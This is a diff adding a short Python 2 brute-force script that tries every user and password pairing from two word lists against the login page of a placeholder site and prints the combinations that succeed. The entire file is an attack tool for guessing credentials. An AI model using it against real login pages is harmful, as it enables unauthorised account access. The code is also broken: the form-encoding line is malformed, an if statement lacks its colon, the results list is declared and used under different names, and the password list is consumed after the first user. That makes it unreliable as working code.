@@ -1,0 +1,34 @@
+#brute force passwords
+import sys
+import urllib
+import urllib2
+
+if len(sys.argv) !=3:
+    print "usage: %s userlist passwordlist" % (sys.argv[0])
+    sys.exit(0)
+    
+filename1=str(sys.argv[1])
+filename2=str(sys.argv[2])
+userlist = open(filename1,'r')
+passwordlist = open(filename2,'r')
+url = "http://www.vulnerablesite.com/login.html"
+foundusers = []
+FailStr="Incorrect User or Password"
+
+for user in userlist:
+    for password in passwordlist:
+        data = urllib.urlencode({"username="user&"password="password})
+        request = urllib2.urlopen(url,data)
+        response = request.read()
+
+        if(response.find(FailStr)<0)
+            foundcreds.append(user+":"+password)
+        request.close()
+        
+if len(foundcreds)>0:
+    print "Found User and Password combinations:\n"
+
+    for name in foundcreds:
+        print name+"\n"
+else:
+    print "No users found\n"
